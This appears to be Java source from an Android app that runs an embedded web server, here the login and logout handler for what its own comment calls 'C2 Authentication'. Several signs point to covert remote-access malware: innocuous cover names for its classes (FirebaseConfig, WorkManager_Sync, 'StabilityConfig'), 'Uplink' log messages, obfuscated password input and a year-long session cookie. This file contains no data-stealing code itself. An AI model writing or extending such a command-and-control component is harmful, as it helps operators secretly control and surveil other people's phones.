package com.labs.labrats.router;

import android.content.Context;
import android.util.Base64;

import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.WorkManager_Sync;

import java.util.HashMap;
import java.util.UUID;

import fi.iki.elonen.NanoHTTPD;
import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

/**
 * Controller handling C2 Authentication, Login, and Logout sessions.
 */
public class AuthController {

    private final Context context;
    private final FirebaseConfig server;

    public AuthController(Context context, FirebaseConfig server) {
        this.context = context;
        this.server = server;
    }

    public Response handleLogin(IHTTPSession session, String loginHtml) {
        if (session.getMethod() != NanoHTTPD.Method.POST) {
            return server.serveGzippedProxy(session, "text/html", loginHtml);
        }

        try {
            session.parseBody(new HashMap<>());
            String pass = session.getParms().get("password");

            // De-obfuscate payload if masked
            if (pass != null && pass.startsWith("0x_")) {
                try {
                    byte[] decoded = Base64.decode(pass.substring(3), Base64.DEFAULT);
                    pass = new StringBuilder(new String(decoded, "UTF-8")).reverse().toString();
                } catch (Exception ignored) {}
            }

            boolean isJson = "true".equals(session.getParms().get("json"));
            boolean isAuthenticated = PasswordHasher.verifyPassword(context, pass);

            if (isAuthenticated) {
                FirebaseConfig.logActivity("AUTHENTICATION_SUCCESS: Uplink established");

                Response response;
                if (isJson) {
                    response = NanoHTTPD.newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                } else {
                    response = NanoHTTPD.newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                    response.addHeader("Location", "/");
                }

                String token = WorkManager_Sync.activeSessionToken;
                if (token == null || token.isEmpty()) {
                    token = UUID.randomUUID().toString();
                    WorkManager_Sync.activeSessionToken = token;
                }
                response.addHeader("Set-Cookie", "token=" + token + "; Path=/; HttpOnly; Max-Age=31536000");
                return response;
            } else {
                FirebaseConfig.logActivity("UPLINK_DENIED: Invalid credentials");
                if (isJson) {
                    return NanoHTTPD.newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
                } else {
                    return server.serveGzippedProxy(session, "text/html", loginHtml.replace("RESTRICTED_ACCESS", "INVALID_CREDENTIALS"));
                }
            }
        } catch (Exception e) {
            return server.serveErrorProxy("Login Authentication Exception: " + e.getMessage());
        }
    }

    public Response handleLogout(IHTTPSession session, String logoutHtml) {
        FirebaseConfig.logActivity("AUTHENTICATION_TERMINATED: Session closed");
        String newToken = UUID.randomUUID().toString();
        WorkManager_Sync.activeSessionToken = newToken;
        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putString("session_token", newToken).apply();

        return server.serveGzippedProxy(session, "text/html", logoutHtml);
    }
}
